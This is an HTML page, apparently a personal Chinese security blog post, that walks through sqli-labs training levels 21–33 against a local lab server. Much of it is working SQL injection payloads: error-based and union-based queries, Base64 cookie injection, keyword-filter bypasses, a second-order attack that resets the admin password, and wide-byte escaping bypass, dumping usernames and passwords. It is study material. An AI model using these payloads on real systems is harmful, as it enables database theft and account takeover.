@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>sqli通关 | Hexo</title>
+  <meta name="description" content="sqlisqli-less-1sqli-less-21123使用yakit抓包对YWRtaW4&#x3D;进行解码发现是Base编码&#x27;)闭合  1234爆库：admin&#x27;)and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -Base编码YWRtaW4nKWFuZCAoZXh0cmFjdHZhbHVlKDEsY29u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli通关">
+<meta property="og:url" content="http://example.com/2023/12/26/sqli%E9%80%9A%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqlisqli-less-1sqli-less-21123使用yakit抓包对YWRtaW4&#x3D;进行解码发现是Base编码&#x27;)闭合  1234爆库：admin&#x27;)and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -Base编码YWRtaW4nKWFuZCAoZXh0cmFjdHZhbHVlKDEsY29u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227113135468.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227105831548.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226215144993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226215037556.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226210522645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226205543889.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226194352700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226202521803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203127991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203511063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203647119.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226171859260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226193310655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226204605993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227101653759.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227102227989.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227104354783.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227103852939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227105526933.png">
+<meta property="article:published_time" content="2023-12-26T09:14:39.000Z">
+<meta property="article:modified_time" content="2023-12-27T03:32:02.633Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227113135468.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2023/12/26/sqli%E9%80%9A%E5%85%B3/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center theme-black# 主题颜色 theme-black theme-blue theme-green theme-purple" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/hkbijihxl" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">hkbijihxl</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">汀花雨细，水树风闲，又是秋来。</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> changsha, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/hkbijihxl" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/u/7832381828" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">12</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/26/sqli%E9%80%9A%E5%85%B3/" class="title">sqli通关</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-26T09:14:39.000Z" itemprop="datePublished">2023-12-26</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/20/sql%E6%B3%A8%E5%85%A5/" class="title">sql注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-20T10:27:48.000Z" itemprop="datePublished">2023-12-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/16/PHP/" class="title">PHP</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-16T12:31:26.000Z" itemprop="datePublished">2023-12-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/11/vue/" class="title">vue</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-11T01:18:53.000Z" itemprop="datePublished">2023-12-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/10/WireShark%E3%80%81AhMyth%E4%BD%BF%E7%94%A8/" class="title">WireShark、AhMyth使用</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-10T05:33:28.000Z" itemprop="datePublished">2023-12-10</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-sqli通关" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli通关
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/12/26/sqli%E9%80%9A%E5%85%B3/" class="article-date">
+	  <time datetime="2023-12-26T09:14:39.000Z" itemprop="datePublished">2023-12-26</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/12/26/sqli%E9%80%9A%E5%85%B3/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h4 id="sqli-less-1"><a href="#sqli-less-1" class="headerlink" title="sqli-less-1"></a>sqli-less-1</h4><h4 id="sqli-less-21"><a href="#sqli-less-21" class="headerlink" title="sqli-less-21"></a>sqli-less-21</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用yakit抓包</span><br><span class="line">对YWRtaW4=进行解码发现是Base编码</span><br><span class="line">&#x27;)闭合</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line">admin&#x27;)and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br><span class="line">Base编码</span><br><span class="line">YWRtaW4nKWFuZCAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkpLS0gLQ==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227113135468.png" alt="image-20231227113135468"></p>
+<h4 id="sqli-less-22"><a href="#sqli-less-22" class="headerlink" title="sqli-less-22"></a>sqli-less-22</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用yakit抓包</span><br><span class="line">对YWRtaW4=进行解码发现是Base编码</span><br><span class="line">&quot;闭合</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line">admin&quot;and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br><span class="line">进行Base编码，替换</span><br><span class="line">Cookie: uname= YWRtaW4iYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSktLSAt</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227105831548.png" alt="image-20231227105831548"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226215144993.png" alt="image-20231226215144993"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226215037556.png" alt="image-20231226215037556"></p>
+<h4 id="sqli-less-23"><a href="#sqli-less-23" class="headerlink" title="sqli-less-23"></a>sqli-less-23</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;闭合，字符型</span><br><span class="line">爆库：</span><br><span class="line">http://192.168.2.56/sqli/Less-23/?id=-1&#x27; union select 1,database(),3&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226210522645.png" alt="image-20231226210522645"></p>
+<h4 id="sqli-less-24"><a href="#sqli-less-24" class="headerlink" title="sqli-less-24"></a>sqli-less-24</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建一个用户</span><br><span class="line">username=admin&#x27;-- -</span><br><span class="line">password=111</span><br><span class="line">使用新建的用户登录，修改密码为123</span><br><span class="line">再使用admin登录，密码123，登录成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226205543889.png" alt="image-20231226205543889"></p>
+<h4 id="sqli-less-25"><a href="#sqli-less-25" class="headerlink" title="sqli-less-25"></a>sqli-less-25</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">报错注入：and or使用&amp;&amp; ||替换</span><br><span class="line">爆库：</span><br><span class="line">http://192.168.2.56/sqli/Less-25/?id=1&#x27;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))||&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226194352700.png" alt="image-20231226194352700"></p>
+<h4 id="sqli-less-25a"><a href="#sqli-less-25a" class="headerlink" title="sqli-less-25a"></a>sqli-less-25a</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or and 被过滤，使用oorr anandd 替换</span><br><span class="line">?id=1 anandd 1=1 页面正常回显，数字型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line">http://192.168.2.56/sqli/Less-25a/?id=-1 union select 1,database(),3 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226202521803.png" alt="image-20231226202521803"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆表：</span><br><span class="line">http://192.168.2.56/sqli/Less-25a/?id=-1 union  select 1,group_concat(table_name) ,3 from infoorrmation_schema.tables where table_schema=database()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203127991.png" alt="image-20231226203127991"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段：</span><br><span class="line">http://192.168.2.56/sqli/Less-25a/?id=-1 union  select 1,group_concat(column_name) ,3 from infoorrmation_schema.columns where table_name=&#x27;users&#x27; anandd table_schema=database();--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203511063.png" alt="image-20231226203511063"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆数据：</span><br><span class="line">http://192.168.2.56/sqli/Less-25a/?id=-1 union  select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,passwoorrd),3 from users;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226203647119.png" alt="image-20231226203647119"></p>
+<h4 id="sqli-less-26"><a href="#sqli-less-26" class="headerlink" title="sqli-less-26"></a>sqli-less-26</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">报错注入：and or使用&amp;&amp; ||替换</span><br><span class="line">爆库：</span><br><span class="line">http://192.168.2.56/sqli/Less-26/?id=&#x27;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))||&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226171859260.png" alt="image-20231226171859260"></p>
+<h4 id="sqli-less-26a"><a href="#sqli-less-26a" class="headerlink" title="sqli-less-26a"></a>sqli-less-26a</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">盲注：判断数据库长度为8</span><br><span class="line">http://192.168.2.56/sqli/Less-26a/?id=1&#x27;)anandd(length(database())=8)anandd(&#x27;1 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226193310655.png" alt="image-20231226193310655"></p>
+<h4 id="sqli-less-29"><a href="#sqli-less-29" class="headerlink" title="sqli-less-29"></a>sqli-less-29</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;闭合，字符型</span><br><span class="line">爆库：</span><br><span class="line">http://192.168.2.56/sqli/Less-29/?id=-1&#x27;union select 1,database(),3&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231226204605993.png" alt="image-20231226204605993"></p>
+<h4 id="sqli-less-30"><a href="#sqli-less-30" class="headerlink" title="sqli-less-30"></a>sqli-less-30</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;闭合，字符型</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-30/?id=-1 &quot;union select 1,database(),3 --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227101653759.png" alt="image-20231227101653759"></p>
+<h4 id="sqli-less-31"><a href="#sqli-less-31" class="headerlink" title="sqli-less-31"></a>sqli-less-31</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;)闭合，双引号加括号</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-31/?id=1&quot;)and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227102227989.png" alt="image-20231227102227989"></p>
+<h4 id="sqli-less-32"><a href="#sqli-less-32" class="headerlink" title="sqli-less-32"></a>sqli-less-32</h4><blockquote>
+<p>输入?id&#x3D;1’，发现’变成了\ ‘,被转义了</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227104354783.png" alt="image-20231227104354783"></p>
+</blockquote>
+<p>addslashes()函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addslashes ( string `$str` ) : string</span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span><br><span class="line">这些字符是单引号（`&#x27;`）、双引号（`&quot;`）、反斜线（`\`）与 NUL（**`null`** 字符）。</span><br><span class="line">只要注入&#x27;  &quot;  \ 空字符 都会转义为 \&#x27;  \&quot; \\ \   </span><br><span class="line">魔术单引号同理【PHP5.4及其以上魔术引号是被删除了】</span><br></pre></td></tr></table></figure>
+
+<p>宽字节注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%DF&#x27;:	</span><br><span class="line">- 会被PHP当中的addslashes函数转义为：%DF\&#x27;   </span><br><span class="line">- \ 会被URL编码为 %5C</span><br><span class="line">- 那么 %DF&#x27;  会被转义为 %DF%5C%27</span><br><span class="line">- %DF%5C%27是一个宽字节 也就是一个&#x27;</span><br><span class="line">从而可以进行构造闭合，进行注入</span><br><span class="line">小技巧：有的时候我们也可以用16进制来代替字符串</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆库：http://192.168.2.25/sqli/Less-32/?id=-1%df&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227103852939.png" alt="image-20231227103852939"></p>
+<h4 id="sqli-less-33"><a href="#sqli-less-33" class="headerlink" title="sqli-less-33"></a>sqli-less-33</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">和上一关一样，&#x27;被转义成\&#x27;</span><br><span class="line">爆库：http://192.168.2.25/sqli/Less-33/?id=-1%df&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20231227105526933.png" alt="image-20231227105526933"></p>
+<h4 id="sqli-less-34"><a href="#sqli-less-34" class="headerlink" title="sqli-less-34"></a>sqli-less-34</h4>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2023/12/26/sqli%E9%80%9A%E5%85%B3/" title="sqli通关" target="_blank" rel="external">http://example.com/2023/12/26/sqli通关/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/hkbijihxl" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/hkbijihxl" target="_blank"><span class="text-dark">hkbijihxl</span><small class="ml-1x">汀花雨细，水树风闲，又是秋来。</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2023/12/20/sql%E6%B3%A8%E5%85%A5/" title="sql注入"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/hkbijihxl" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/u/7832381828" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
